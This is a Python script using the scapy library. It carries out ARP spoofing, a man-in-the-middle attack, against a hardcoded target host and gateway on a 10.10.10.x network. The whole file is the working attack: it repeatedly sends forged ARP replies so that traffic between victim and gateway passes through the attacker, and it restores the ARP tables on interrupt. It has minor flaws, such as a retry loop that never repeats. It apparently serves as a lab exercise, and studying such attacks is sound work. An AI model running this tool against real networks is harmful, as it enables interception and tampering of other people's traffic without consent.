import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import time


def get_mac(ip):
    mac = "x"
    while mac == "x":
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
            mac = answered_list[0][1].hwsrc
        except:
            print("No mac")
        finally:
            return mac


def spoof(t_ip, spoof_ip):
    packet = ARP(op="is-at", pdst=t_ip, hwdst=get_mac(t_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op="is-at", pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


target_ip = "10.10.10.20"
gateway_ip = "10.10.10.254"

if __name__ == '__main__':
    try:
        counter = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            counter += 2
            print("\rPackets Sent " + str(counter))
            time.sleep(2)

    except KeyboardInterrupt:
        print("KeyboardInterrupt")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("Spoofing topped, addresses restored")
